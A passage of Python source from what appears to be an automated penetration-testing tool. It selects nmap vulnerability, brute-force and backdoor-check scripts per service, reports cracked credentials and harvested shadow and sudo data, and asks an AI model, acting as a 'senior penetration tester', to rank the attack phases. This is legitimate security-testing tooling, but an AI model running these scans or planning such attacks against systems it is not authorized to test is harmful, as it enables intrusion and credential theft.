#
# Takes input from: findings list (service detection), nmap_output
# Feeds into: main findings list (CVE confirmations, src="dc_probe")
#             live_adapt trigger "CVEs→vulnprobe" promotes this phase when CVEs are found

# Targeted NSE vuln scripts per service — used to confirm specific weaknesses
SERVICE_VULN_SCRIPTS: dict[str, list[str]] = {
    "http":         ["http-vuln*", "http-shellshock", "http-csrf",
                     "http-dombased-xss", "http-stored-xss",
                     "http-auth-finder", "http-method-tamper"],
    "https":        ["http-vuln*", "ssl-heartbleed", "ssl-poodle",
                     "ssl-ccs-injection", "ssl-dh-params",
                     "tls-ticketbleed", "ssl-known-primes"],
    "ftp":          ["ftp-vsftpd-backdoor", "ftp-anon", "ftp-proftpd-backdoor",
                     "ftp-bounce"],
    "ssh":          ["ssh-auth-methods", "ssh2-enum-algos",
                     "sshv1"],
    "smb":          ["smb-vuln*", "smb-security-mode",
                     "smb2-security-mode", "smb2-vuln-uptime"],
    "rdp":          ["rdp-vuln-ms12-020", "rdp-enum-encryption"],
    "smtp":         ["smtp-vuln*", "smtp-open-relay"],
    "mysql":        ["mysql-vuln*", "mysql-empty-password", "mysql-databases"],
    "mssql":        ["ms-sql-empty-password", "ms-sql-info", "ms-sql-xp-cmdshell"],
    "postgresql":   ["pgsql-brute"],
    "mongodb":      ["mongodb-info", "mongodb-databases"],
    "redis":        ["redis-info"],
    "vnc":          ["vnc-info", "vnc-brute", "realvnc-auth-bypass"],
}

# General vuln scripts always run regardless of service
GENERAL_VULN_SCRIPTS = [
    "vuln",
    "exploit",
]


def run_vuln_probe(
    target: str, mode: int, sdir: str, findings: list[dict]
) -> list[dict]:
    """
    Run nmap --script vuln (+ service-specific scripts) against confirmed
    open ports. Returns list of confirmed vuln finding dicts.
    """
    if not avail("nmap"):
        return []

    # Build port → service map from existing findings
    port_svc: dict[int, str] = {}
    for f in findings:
        if "port" in f and "service" in f:
            port_svc[int(f["port"])] = f["service"].lower()

    if not port_svc:
        console.print("[dim][~] No open ports in findings — skipping vuln probe[/dim]")
        return []

    console.print("\n[bold cyan][+] Vulnerability probe (nmap NSE vuln scripts)…[/bold cyan]")

    # Collect scripts to run
    scripts: set[str] = set(GENERAL_VULN_SCRIPTS)
    for port, svc in port_svc.items():
        for svc_key, svc_scripts in SERVICE_VULN_SCRIPTS.items():
            if svc_key in svc:
                scripts.update(svc_scripts)

    ports_str = ",".join(str(p) for p in sorted(port_svc.keys()))
    timing    = {1: "-T1", 2: "-T2", 3: "-T4", 4: "-T5"}[mode]
    out       = phase_out(sdir, "vuln_probe.txt")

    run_cmd(
        ["nmap", timing, "-p", ports_str,
         "--script", ",".join(sorted(scripts)),
         "-oN", out, target],
        out, timeout=1200, tool_label="nmap-vuln",
    )

    raw = read_file(out)
    return _parse_vuln_probe(raw)


def _parse_vuln_probe(nmap_vuln_output: str) -> list[dict]:
    """Parse nmap vuln script output into structured findings."""
    results:  list[dict] = []
    cur_port: str = ""
    cur_script = ""
    buf: list[str] = []

    for line in nmap_vuln_output.splitlines():
        # Port header:  80/tcp open http
        pm = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
        if pm:
            cur_port = pm.group(1)
            continue

        # Script output header:  | script-name:
        sm = re.match(r"\|\s+([\w\-]+):", line)
        if sm:
            if cur_script and buf:
                results.append(_make_vuln_finding(cur_port, cur_script, buf))
            cur_script = sm.group(1)
            buf = [line]
            continue

        if line.startswith("|") and cur_script:
            buf.append(line)
        elif cur_script and buf:
            results.append(_make_vuln_finding(cur_port, cur_script, buf))
            cur_script = ""
            buf = []

    if cur_script and buf:
        results.append(_make_vuln_finding(cur_port, cur_script, buf))

    # Filter to only interesting (non-info) findings
    interesting = []
    skip_scripts = {"ssh2-enum-algos", "http-auth-finder", "ssl-dh-params"}
    for r in results:
        if r["vuln_script"] in skip_scripts:
            continue
        text = r["vuln_detail"].lower()
        if any(kw in text for kw in
               ["vulnerable", "exploit", "critical", "cve-", "backdoor",
                "bypass", "injection", "rce", "disclosure", "overflow"]):
            r["vuln_confirmed"] = True
        interesting.append(r)

    if interesting:
        t = Table(
            title=f"[bold red]VULN PROBE RESULTS — {len(interesting)} finding(s)[/bold red]",
            box=box.SIMPLE_HEAD, show_lines=True, expand=True,
        )
        t.add_column("Port",   width=7)
        t.add_column("Script", width=28)
        t.add_column("Confirmed", width=11)
        t.add_column("Detail", ratio=1)
        for r in interesting:
            conf_col = "[bold red]YES[/bold red]" if r.get("vuln_confirmed") else "[dim]maybe[/dim]"
            t.add_row(
                r["vuln_port"],
                f"[cyan]{r['vuln_script']}[/cyan]",
                conf_col,
                r["vuln_detail"][:120],
            )
        console.print(t)
    else:
        console.print("[dim][~] No notable vulnerabilities confirmed by probe[/dim]")

    return interesting


def _make_vuln_finding(port: str, script: str, buf: list[str]) -> dict:
    detail = " ".join(
        line.lstrip("|_ ") for line in buf if line.strip() not in ("|", "")
    )
    return {
        "vuln_port":      port,
        "vuln_script":    script,
        "vuln_detail":    detail[:500],
        "vuln_confirmed": False,
        "src":            "dc_vulnprobe",
    }


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 10 — REPORT SAVE  (combined findings)
# ══════════════════════════════════════════════════════════════════════════════
#
# Serialises all findings accumulated across every phase into persistent artifacts.
#   _sev_label(f)            — normalises any finding dict to CRITICAL/HIGH/MEDIUM/LOW/INFO
#                              NOTE: also used by §13 compute_audit_diff for severity flagging
#   save_report()            — writes <sdir>/report_<target>_<ts>.json + .md
#                              JSON: full findings list with metadata
#                              Markdown: severity-grouped table for human review
#   print_final_summary()    — rich terminal table grouped by severity; always runs
#
# Takes input from: full findings list (all phases)
# Feeds into: <sdir>/ report files (read by dg_auditor — Tier 4, read-only)

def _sev_label(f: dict) -> str:
    """Assign a display severity to a finding for the summary table."""
    if "cred"          in f: return "CRITICAL"
    if "cve"           in f: return "HIGH"
    # Post-auth critical flags surfaced as issues
    src = f.get("src", "")
    if src == "dc_postauth":
        issue = f.get("issue", "")
        if "shadow" in issue or "sudo" in issue or "SUID" in issue:
            return "CRITICAL"
        if "post_auth_data" in f:
            data = f.get("post_auth_data", {})
            if data.get("shadow") or "nopasswd" in str(data.get("sudo_privs","")).lower():
                return "CRITICAL"
        return "HIGH"
    if src == "dc_vulnprobe":
        return "CRITICAL" if f.get("vuln_confirmed") else "HIGH"
    if src == "dc_fuzz":
        status = f.get("fuzz_status", "")
        return "MEDIUM" if status.startswith(("2", "3")) else "LOW"
    if "hvf_name" in f:
        cat = f.get("hvf_category", "")
        return {"credentials": "CRITICAL", "backups": "HIGH", "configs": "HIGH",
                "documents": "MEDIUM", "source_code": "MEDIUM"}.get(cat, "LOW")
    if f.get("issue") == "SMB null session": return "HIGH"
    if "juicy"    in f: return "MEDIUM"
    if "user"     in f: return "INFO"
    if "port"     in f: return "INFO"
    if "tech"     in f: return "INFO"
    if "os_guess" in f: return "INFO"
    if "dns"      in f: return "INFO"
    return "INFO"


SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_RICH  = {
    "CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow",
    "LOW": "green", "INFO": "dim",
}


def print_final_summary(findings: list[dict], target: str, sdir: str):
    """Print a colour-coded terminal recap table of all findings, sorted by severity."""
    tagged = [(f, _sev_label(f)) for f in findings]
    tagged.sort(key=lambda x: SEV_ORDER.get(x[1], 99))

    counts = {}
    for _, sev in tagged:
        counts[sev] = counts.get(sev, 0) + 1

    count_str = "  ".join(
        f"[{SEV_RICH[s]}]{s}:{counts[s]}[/{SEV_RICH[s]}]"
        for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        if s in counts
    )
    console.print(Panel(
        f"[bold white]TARGET:[/bold white] [cyan]{target}[/cyan]   "
        f"[bold white]TOTAL FINDINGS:[/bold white] [white]{len(findings)}[/white]\n"
        + count_str,
        title="[bold red]◈ FINAL SUMMARY ◈[/bold red]",
        border_style="red",
    ))

    t = Table(box=box.SIMPLE_HEAD, show_lines=True, expand=True)
    t.add_column("Sev",     width=9)
    t.add_column("Type",    width=14)
    t.add_column("Detail",  ratio=1)
    t.add_column("Source",  width=12)

    for f, sev in tagged:
        col = SEV_RICH[sev]
        src = f.get("src", "")
        if "cred" in f:
            detail = f"{f['cred']} on {f['service']}:{f['port']}"
            ftype  = "Credential"
        elif "cve" in f:
            detail = f"{f['cve']}  {f.get('evidence','')[:60]}"
            ftype  = "CVE"
        elif "hvf_name" in f:
            detail = f"{f['hvf_name']}  @ {f['hvf_path']}"
            ftype  = f.get("hvf_label","File")[:14]
        elif "os_guess" in f:
            detail = f"{f['os_guess']} {f.get('os_accuracy','')}"
            ftype  = "OS Fingerprint"
        elif "port" in f and "service" in f:
            detail = f"{f['port']}/{f['proto']}  {f['service']}"
            ftype  = "Open Port"
        elif src == "dc_fuzz":
            detail = f"[{f.get('fuzz_status','?')}] {f.get('fuzz_url','')[:80]}"
            ftype  = f"Fuzz/{f.get('fuzz_type','dir')}"
        elif src == "dc_postauth" and "post_auth_data" in f:
            detail = f"{f.get('post_auth_user','')}@{f.get('post_auth_host','')}:{f.get('post_auth_port','')}"
            ftype  = "Post-Auth"
        elif src == "dc_vulnprobe":
            confirmed = "✓ CONFIRMED" if f.get("vuln_confirmed") else "possible"
            detail = f"[{confirmed}] {f.get('vuln_script','')} port {f.get('vuln_port','')} — {f.get('vuln_detail','')[:60]}"
            ftype  = "VulnProbe"
        elif "issue" in f:
            detail = f.get("evidence", f["issue"])[:80]
            ftype  = "Issue"
        elif "juicy" in f:
            detail = f.get("evidence", f["juicy"])[:80]
            ftype  = "Juicy Path"
        elif "user" in f:
            detail = f["user"]
            ftype  = "Enumerated User"
        elif "tech" in f:
            detail = f.get("evidence", f["tech"])[:80]
            ftype  = "Technology"
        elif "dns" in f:
            detail = f.get("evidence", f["dns"])[:80]
            ftype  = "DNS Record"
        else:
            detail = str(f)[:80]
            ftype  = "Finding"

        t.add_row(
            f"[{col}]{sev}[/{col}]",
            ftype,
            detail,
            f"[dim]{src}[/dim]",
        )
    console.print(t)


def _md_escape(s: str) -> str:
    return str(s).replace("|", "\\|").replace("\n", " ")


def save_report(findings: list[dict], target: str, sdir: str) -> str:
    """Save both the raw JSON and a human-readable Markdown report."""
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = Path.home() / f"report_{target}_{ts}"

    # ── JSON ──────────────────────────────────────────────────────────────
    json_path = str(base) + ".json"
    with open(json_path, "w") as f:
        json.dump({"target": target, "generated": ts, "findings": findings}, f, indent=2)

    # ── Markdown ──────────────────────────────────────────────────────────
    md_path = str(base) + ".md"
    tagged  = sorted(
        [(f, _sev_label(f)) for f in findings],
        key=lambda x: SEV_ORDER.get(x[1], 99),
    )

    lines = [
        f"# dig_champs Report — {target}",
        f"**Generated:** {ts}  |  **Findings:** {len(findings)}\n",
        "---\n",
        "## Summary\n",
        "| Severity | Count |",
        "|----------|-------|",
    ]
    counts: dict[str, int] = {}
    for _, s in tagged:
        counts[s] = counts.get(s, 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in counts:
            lines.append(f"| {sev} | {counts[sev]} |")

    lines += [
        "\n---\n",
        "## All Findings\n",
        "| Sev | Type | Detail | Source |",
        "|-----|------|--------|--------|",
    ]
    for f, sev in tagged:
        src = f.get("src", "—")
        if "cred" in f:
            detail = f"{f['cred']} on {f['service']}:{f['port']}"
            ftype  = "Credential"
        elif "cve" in f:
            detail = f"{f['cve']} — {f.get('evidence','')[:60]}"
            ftype  = "CVE"
        elif "hvf_name" in f:
            detail = f"`{f['hvf_name']}` @ `{f['hvf_path']}`"
            ftype  = f.get("hvf_label","File")
        elif "os_guess" in f:
            detail = f"{f['os_guess']} {f.get('os_accuracy','')}"
            ftype  = "OS Fingerprint"
        elif "port" in f and "service" in f:
            detail = f"{f['port']}/{f.get('proto','tcp')} {f['service']}"
            ftype  = "Open Port"
        elif src == "dc_fuzz":
            detail = f"[{f.get('fuzz_status','?')}] {f.get('fuzz_url','')}"
            ftype  = f"Fuzz/{f.get('fuzz_type','dir')}"
        elif src == "dc_postauth" and "post_auth_data" in f:
            detail = f"{f.get('post_auth_user','')}@{f.get('post_auth_host','')}:{f.get('post_auth_port','')}"
            ftype  = "Post-Auth"
        elif src == "dc_vulnprobe":
            conf = "CONFIRMED" if f.get("vuln_confirmed") else "possible"
            detail = f"[{conf}] {f.get('vuln_script','')} port {f.get('vuln_port','')} — {f.get('vuln_detail','')[:60]}"
            ftype  = "VulnProbe"
        elif "issue" in f:
            detail = f.get("evidence", f["issue"])[:80]
            ftype  = "Issue"
        elif "juicy" in f:
            detail = f.get("evidence", f["juicy"])[:80]
            ftype  = "Juicy Path"
        elif "user" in f:
            detail = f["user"]
            ftype  = "Enumerated User"
        elif "tech" in f:
            detail = f.get("evidence", f["tech"])[:80]
            ftype  = "Technology"
        elif "dns" in f:
            detail = f.get("evidence", f["dns"])[:80]
            ftype  = "DNS Record"
        else:
            detail = str(f)[:80]
            ftype  = "Finding"
        lines.append(
            f"| {sev} | {_md_escape(ftype)} | {_md_escape(detail)} | {_md_escape(src)} |"
        )

    # ── OS Fingerprint ────────────────────────────────────────────────────
    os_findings = [f for f in findings if "os_guess" in f]
    if os_findings:
        lines += ["\n---\n", "## OS Fingerprint\n"]
        for f in os_findings:
            lines.append(f"- **{f['os_guess']}** {f.get('os_accuracy','')}")
            for cpe in f.get("cpe", []):
                lines.append(f"  - CPE: `{cpe}`")

    # ── Credentials ───────────────────────────────────────────────────────
    cred_findings = [f for f in findings if "cred" in f]
    if cred_findings:
        lines += ["\n---\n", "## Recovered Credentials\n",
                  "| Credential | Service | Port |",
                  "|------------|---------|------|"]
        for f in cred_findings:
            lines.append(
                f"| `{_md_escape(f['cred'])}` | {f.get('service','—')} | {f.get('port','—')} |"
            )

    # ── High-Value Files ──────────────────────────────────────────────────
    hvf_findings = [f for f in findings if "hvf_name" in f]
    if hvf_findings:
        lines += ["\n---\n", "## High-Value Files\n",
                  "| Category | Filename | Path | Source |",
                  "|----------|----------|------|--------|"]
        for f in hvf_findings:
            lines.append(
                f"| {f.get('hvf_label','—')} | `{_md_escape(f['hvf_name'])}` "
                f"| `{_md_escape(f['hvf_path'])}` | {_md_escape(f.get('hvf_source','—'))} |"
            )

    # ── Web Fuzz Results ──────────────────────────────────────────────────
    fuzz_findings = [f for f in findings if f.get("src") == "dc_fuzz"]
    if fuzz_findings:
        lines += ["\n---\n", "## Web Fuzz Results\n",
                  "| Status | Type | URL / Host |",
                  "|--------|------|------------|"]
        for f in sorted(fuzz_findings, key=lambda x: x.get("fuzz_status","999")):
            lines.append(
                f"| {f.get('fuzz_status','?')} | {f.get('fuzz_type','dir')} "
                f"| `{_md_escape(f.get('fuzz_url',''))}` |"
            )

    # ── Post-Auth Enumeration ─────────────────────────────────────────────
    postauth_findings = [f for f in findings if f.get("src") == "dc_postauth"
                         and "post_auth_data" in f]
    if postauth_findings:
        lines += ["\n---\n", "## Post-Auth Enumeration\n"]
        for f in postauth_findings:
            lines.append(
                f"### {f.get('post_auth_user','')}@{f.get('post_auth_host','')} "
                f"({f.get('post_auth_service','').upper()} :{f.get('post_auth_port','')})\n"
            )
            data = f.get("post_auth_data", {})
            for key in ["identity", "kernel", "os_release", "sudo_privs",
                        "suid_bins", "shadow", "users"]:
                if data.get(key):
                    lines.append(f"**{key}:**")
                    lines.append(f"```\n{data[key][:500]}\n```\n")

    # ── Confirmed Vulnerabilities ─────────────────────────────────────────
    probe_findings = [f for f in findings if f.get("src") == "dc_vulnprobe"]
    if probe_findings:
        lines += ["\n---\n", "## Vulnerability Probe Results\n",
                  "| Port | Script | Confirmed | Detail |",
                  "|------|--------|-----------|--------|"]
        for f in probe_findings:
            conf = "✓ YES" if f.get("vuln_confirmed") else "possible"
            lines.append(
                f"| {f.get('vuln_port','?')} | `{_md_escape(f.get('vuln_script',''))}` "
                f"| {conf} | {_md_escape(f.get('vuln_detail','')[:120])} |"
            )

    Path(md_path).write_text("\n".join(lines), encoding="utf-8")

    console.print(f"\n[green][+] {len(findings)} findings → {json_path}[/green]")
    console.print(f"[green][+] Markdown report  → {md_path}[/green]")
    return json_path


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 11 — LIVE ADAPT ENGINE  (dynamic phase queue)
# ══════════════════════════════════════════════════════════════════════════════
#
# Implements Tier 1 (strategic) and Tier 2 (reactive) queue authority.
# See Section 0 for the full pipeline authority contract.
#
#   _SCANNABLE_PHASES        — {filehunt, webfuzz, postauth, vulnprobe}
#                              phases the advisor/rules are permitted to reorder
#   _TERMINAL_PHASES         — {vulnreport, artifacts}
#                              always pinned to end; never reordered
#
#   live_adapt_rules()       — TIER 2: called after every phase in main()'s dynamic loop
#                              Rules (pull-forward only, no completed phase re-insertion):
#                                creds found       → promote postauth
#                                SMB null session  → promote filehunt
#                                CVEs found        → promote vulnprobe
#                                juicy web paths   → promote webfuzz
#
#   claude_strategic_advisor() — TIER 1: called ONCE after creds, before loop starts
#                              Sends findings + current queue to claude-opus-4-6
#                              Returns tuple[list[str], dict] — reordered queue + metadata
#                              Skipped if --no-artifacts or ANTHROPIC_API_KEY not set
#
#   _detect_fired_rules()    — read-only mirror of live_adapt_rules; returns human-readable
#                              rule labels (e.g. "creds→postauth") without reordering
#                              Called by main() after live_adapt_rules fires;
#                              result passed to TrajectoryRecorder.record_adapt()

# Phases that can be reordered by the engine
_SCANNABLE_PHASES: set[str] = {"filehunt", "webfuzz", "postauth", "vulnprobe"}
# Terminal phases always stay at the end (need complete findings)
_TERMINAL_PHASES:  set[str] = {"vulnreport", "artifacts"}


def _adapt_reason(msg: str):
    console.print(f"[bold cyan][~] LIVE ADAPT:[/bold cyan] {msg}")


def live_adapt_rules(
    findings: list[dict],
    cred_results: list[dict],
    phase_queue: list[str],
) -> list[str]:
    """
    Examine current findings and reorder the remaining phase queue using
    rule-based heuristics.  Terminal phases (vulnreport, artifacts) are
    pinned to the end.  Returns the updated queue.
    """
    if not phase_queue:
        return []

    scannable = [p for p in phase_queue if p in _SCANNABLE_PHASES]
    terminal  = [p for p in phase_queue if p in _TERMINAL_PHASES]

    if not scannable:
        return phase_queue  # nothing to reorder

    # ── Signals ───────────────────────────────────────────────────────────
    has_creds      = bool(cred_results)
    has_smb_null   = any(f.get("issue") == "SMB null session" for f in findings)
    has_cves       = any("cve" in f for f in findings)
    has_juicy_web  = any(
        f.get("juicy") in (".env", ".git", ".bak", "wp-admin") for f in findings
    )

    adapted = list(scannable)

    # Rule 1: creds found → post-auth first (act on access immediately)
    if has_creds and "postauth" in adapted and adapted[0] != "postauth":
        adapted.remove("postauth")
        adapted.insert(0, "postauth")
        _adapt_reason("credentials found — post-auth enum moved to front")

    # Rule 2: SMB null session → file hunt front (harvest shares now)
    if has_smb_null and "filehunt" in adapted:
        idx = adapted.index("filehunt")
        if idx > 0:
            adapted.remove("filehunt")
            adapted.insert(0, "filehunt")
            _adapt_reason("SMB null session — file hunt moved to front")

    # Rule 3: CVEs found → vuln probe higher (confirm before deeper lateral)
    if has_cves and "vulnprobe" in adapted:
        # target_pos: behind postauth/filehunt if those were already promoted
        front_count = sum(1 for p in adapted[:2] if p in ("postauth", "filehunt"))
        idx = adapted.index("vulnprobe")
        if idx > front_count:
            adapted.remove("vulnprobe")
            adapted.insert(front_count, "vulnprobe")
            _adapt_reason("CVEs detected — vuln probe moved up the queue")

    # Rule 4: juicy web paths found → web fuzz earlier
    if has_juicy_web and "webfuzz" in adapted:
        front_count = sum(
            1 for p in adapted if p in ("postauth", "filehunt", "vulnprobe")
            and adapted.index(p) < adapted.index("webfuzz")
        )
        idx = adapted.index("webfuzz")
        if idx > front_count:
            adapted.remove("webfuzz")
            adapted.insert(front_count, "webfuzz")
            _adapt_reason("juicy web paths found — web fuzz moved up")

    return adapted + terminal


# ── Claude strategic advisor ──────────────────────────────────────────────────

_ADVISOR_SYSTEM = """You are a senior penetration tester.
Given initial recon findings for a target, return ONLY a JSON object (no markdown
fences) with this exact schema:
{
  "attack_surface_summary": "<one sentence describing the target>",
  "recommended_phase_order": ["<phase>", ...],
  "pivots": ["<one-line reason per ordering decision>", ...]
}
Allowed phase names: filehunt, webfuzz, postauth, vulnprobe
Order them by expected impact given the findings. Most impactful first.
Only include phases that are relevant; omit phases unlikely to yield results."""


def claude_strategic_advisor(
    findings: list[dict],
    cred_results: list[dict],
    phase_queue: list[str],
) -> tuple[list[str], dict]:
    """
    After initial recon + credential phase, ask Claude to recommend a phase
    execution order based on what was discovered.
    Returns (reordered_phase_queue, advisor_meta) where advisor_meta has keys:
      called (bool), attack_surface_summary (str), pivots (list[str]).
    Terminal phases are preserved at end.
    """
    _no_op = (phase_queue, {"called": False, "attack_surface_summary": "", "pivots": []})
    if not _ANTHROPIC_KEY_PRESENT or _OFFLINE_MODE:
        return _no_op

    scannable = [p for p in phase_queue if p in _SCANNABLE_PHASES]
    terminal  = [p for p in phase_queue if p in _TERMINAL_PHASES]

    if not scannable:
        return _no_op

    # Build concise findings summary for the prompt
    open_ports = [
        f"{f['port']}/{f['proto']} {f['service']}"
        for f in findings if "port" in f and "service" in f
    ]
    cves       = [f["cve"] for f in findings if "cve" in f]
    techs      = [f["tech"] for f in findings if "tech" in f]
    issues     = [f["issue"] for f in findings if "issue" in f]
    os_guess   = next((f["os_guess"] for f in findings if "os_guess" in f), "unknown")

    prompt = "\n".join([
        f"Open ports/services: {', '.join(open_ports[:15]) or 'none'}",
        f"OS fingerprint: {os_guess}",
        f"CVEs found: {', '.join(cves[:10]) or 'none'}",
        f"Technologies: {', '.join(techs[:8]) or 'none'}",
        f"Issues: {', '.join(issues[:8]) or 'none'}",
        f"Credentials already cracked: {'yes (' + str(len(cred_results)) + ')' if cred_results else 'no'}",
        f"Available phases to order: {', '.join(scannable)}",
    ])

    ai_client = anthropic.Anthropic()
    with console.status(
        "[bold cyan]Strategic advisor: analysing attack surface…[/bold cyan]"
    ):
        try:
            msg = ai_client.messages.create(
                model="claude-opus-4-6",
                max_tokens=512,
                system=_ADVISOR_SYSTEM,
                messages=[{"role": "user", "content": prompt}],
            )
            raw = msg.content[0].text.strip()
            raw = raw.removeprefix("```json").removeprefix("```").removesuffix("```").strip()
            data = json.loads(raw)
        except anthropic.AuthenticationError:
            console.print(
                "[yellow][~] Claude advisor unavailable (auth error — check ANTHROPIC_API_KEY)"
                " — keeping default order[/yellow]"
            )
            return phase_queue, {"called": False, "attack_surface_summary": "", "pivots": []}
        except Exception as e:
            console.print(
                f"[yellow][~] Claude advisor unavailable ({type(e).__name__})"
                " — keeping default order[/yellow]"
            )
            return phase_queue, {"called": False, "attack_surface_summary": "", "pivots": []}

    console.print(Panel(
        f"[bold white]Attack surface:[/bold white] "
        f"{data.get('attack_surface_summary', '—')}\n\n"
        + "\n".join(f"  • {p}" for p in data.get("pivots", [])),
        title="[bold cyan]◈ STRATEGIC ADVISOR ◈[/bold cyan]",
        border_style="cyan",
    ))

    # Reorder scannable phases per Claude's recommendation
    rec = [p for p in data.get("recommended_phase_order", []) if p in scannable]
    # Append any phases Claude omitted (preserve them at the end of scannable)
    for p in scannable:
        if p not in rec:
            rec.append(p)

    console.print(
        f"[bold cyan][~] Advisor phase order:[/bold cyan] "
        + "  →  ".join(rec)
    )
    return rec + terminal, {
        "called":                  True,
        "attack_surface_summary":  data.get("attack_surface_summary", ""),
        "pivots":                  data.get("pivots", []),
    }


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 13 — SCAN TRAJECTORY  (machine log · human narrative · audit diff)
# ══════════════════════════════════════════════════════════════════════════════
#
# Produces three persistent artifacts in <sdir>/ that fully document the scan.
# All writes are atomic (os.replace from .tmp) so trajectory.json is always valid JSON
# even if the process is killed mid-run.
#
#   _finding_id(f)           — deterministic SHA256[:8] hex of a finding dict
#                              Same finding on two separate scans → same ID (enables delta)
#
#   TrajectoryRecorder       — incremental event log writer to <sdir>/trajectory.json
#     scan_start(queue)      — records initial phase_queue + scan metadata
#     scan_end(n, queue)     — records final queue + total findings count
#     phase_start(p)         — starts internal timer for phase p
#     phase_end(p, new, ..)  — closes phase event, appends to events list, calls _flush()
#     record_tool(...)       — appends tool sub-event to the open phase event
#     record_adapt(...)      — records a Tier 2 queue reorder event
#     record_advisor(...)    — records the Tier 1 Claude advisor event
#     _flush()               — atomic write: json → .tmp → os.replace → trajectory.json
#
#   generate_human_narrative() — writes <sdir>/trajectory_human.md
#     If ANTHROPIC_API_KEY set: asks claude-opus-4-6 to narrate each phase
#     Otherwise: template fallback with one section per phase, one-liner per adapt event
#     Both modes embed <!-- finding:XXXXXXXX --> comments for audit cross-referencing
#
#   compute_audit_diff()     — five-pass diff producing trajectory_audit.json + .md
#     Pass 1: collect machine finding IDs from trajectory.json events
#     Pass 2: parse <!-- finding:ID --> comments from narrative Markdown
#     Pass 3: cross-reference → critical_omissions (CRITICAL/HIGH not in narrative)
#                              → phantom_findings (narrative IDs not in machine log)
#     Pass 4: timing anomalies (duration > mean+2σ, or 0s with cached=False)
#     Pass 5: decision chain gaps (adapt events not mentioned near a decision keyword)
#
# Read by: dg_auditor.py (Tier 4) — strictly read-only, no writes back to <sdir>/

def _finding_id(f: dict) -> str:
    """Deterministic 8-char ID for a finding dict."""
    raw = json.dumps(f, sort_keys=True, default=str).encode()
    return hashlib.sha256(raw).hexdigest()[:8]


class TrajectoryRecorder:
    """Incrementally records scan events; flushes to trajectory.json atomically."""

    def __init__(self, sdir: str, target: str, mode: int):
        self.sdir  = sdir
        self._path = Path(sdir) / "trajectory.json"
        self._tmp  = Path(sdir) / "trajectory.json.tmp"
        self._doc: dict = {
            "schema_version":      "1.0",
            "target":              target,
            "mode":                mode,
            "scan_start":          None,
            "scan_end":            None,
            "total_duration_s":    None,
            "phase_order_initial": [],
            "phase_order_final":   [],
            "total_findings":      0,
            "events":              [],
        }
        self._open_phases: dict[str, dict] = {}
        self._scan_wall_start: float       = time.monotonic()
        # Resume: load existing document if present
        if self._path.exists():
            try:
                self._doc = json.loads(self._path.read_text())
                self._doc["events"].append({
                    "event":     "scan_resumed",
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                })
            except Exception:
                pass  # corrupt — start fresh

    def scan_start(self, initial_queue: list[str]) -> None:
        self._doc["scan_start"]           = datetime.utcnow().isoformat() + "Z"
        self._doc["phase_order_initial"]  = list(initial_queue)
        self._scan_wall_start             = time.monotonic()
        self._flush()

    def scan_end(self, total_findings: int, final_queue: list[str]) -> None:
        self._doc["scan_end"]          = datetime.utcnow().isoformat() + "Z"
        self._doc["total_findings"]    = total_findings
        self._doc["phase_order_final"] = list(final_queue)
        self._doc["total_duration_s"]  = round(time.monotonic() - self._scan_wall_start, 2)
        self._flush()

    def phase_start(self, phase: str) -> None:
        self._open_phases[phase] = {"start_t": time.monotonic(), "tools": []}

    def record_tool(self, phase: str, tool: str, exit_ok: bool, duration_s: float) -> None:
        if phase in self._open_phases:
            self._open_phases[phase]["tools"].append({
                "tool":       tool,
                "exit_ok":    exit_ok,
                "duration_s": round(duration_s, 2),
            })

    def phase_end(
        self,
        phase: str,
        new_findings: list[dict],
        error: str | None = None,
        cached: bool = False,
    ) -> None:
        info       = self._open_phases.pop(phase, {"start_t": time.monotonic(), "tools": []})
        duration_s = round(time.monotonic() - info["start_t"], 2)
        self._doc["events"].append({
            "event":     "phase_end",
            "phase":     phase,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "duration_s": duration_s,
            "cached":    cached,
            "tools":     info["tools"],
            "findings_added": {
                "count": len(new_findings),
                "ids":   [_finding_id(f) for f in new_findings],
            },
            "error": error,
        })
        self._flush()

    def record_adapt(
        self,
        after_phase: str,
        old_queue: list[str],
        new_queue: list[str],
        rules_fired: list[str],
    ) -> None:
        self._doc["events"].append({
            "event":       "adapt_rules",
            "timestamp":   datetime.utcnow().isoformat() + "Z",
            "after_phase": after_phase,
            "old_queue":   list(old_queue),
            "new_queue":   list(new_queue),
            "rules_fired": rules_fired,
        })
        self._flush()

    def record_tier0(
        self,
        suggestions: list[dict],
        designer_explain: str,
        detected_os: str = "unknown",
        os_confidence: str = "none",
    ) -> None:
        """Record the Tier 0 Path Designer event in the trajectory."""
        self._doc["events"].append({
            "event":              "tier0_path_design",
            "timestamp":          datetime.utcnow().isoformat() + "Z",
            "detected_os":        detected_os,
            "os_confidence":      os_confidence,
            "suggestions_count":  len(suggestions),
            "top_suggestions":    [s["id"] for s in suggestions[:5]],
            "designer_rationale": designer_explain,
        })
        self._flush()

    def record_advisor(
        self,
        old_queue: list[str],
        new_queue: list[str],
        attack_surface_summary: str,
        pivots: list[str],
    ) -> None:
        self._doc["events"].append({
            "event":                  "adapt_claude",
            "timestamp":              datetime.utcnow().isoformat() + "Z",
            "old_queue":              list(old_queue),
            "new_queue":              list(new_queue),
            "attack_surface_summary": attack_surface_summary,
            "advisor_pivots":         list(pivots),
        })
        self._flush()

    def _flush(self) -> None:
        try:
            self._tmp.write_text(
                json.dumps(self._doc, indent=2, default=str), encoding="utf-8"
            )
            os.replace(str(self._tmp), str(self._path))
        except Exception:
            pass  # never crash the scan over logging


def _detect_fired_rules(
    findings: list[dict],
    cred_results: list[dict],
    old_queue: list[str],
    new_queue: list[str],
) -> list[str]:
    """Read-only mirror of live_adapt_rules — returns labels for rules that fired."""
    fired: list[str] = []
    has_creds     = bool(cred_results)
    has_smb_null  = any(f.get("issue") == "SMB null session" for f in findings)
    has_cves      = any("cve" in f for f in findings)
    has_juicy_web = any(
        f.get("juicy") in (".env", ".git", ".bak", "wp-admin") for f in findings
    )
    if has_creds and new_queue and new_queue[0] == "postauth" and \
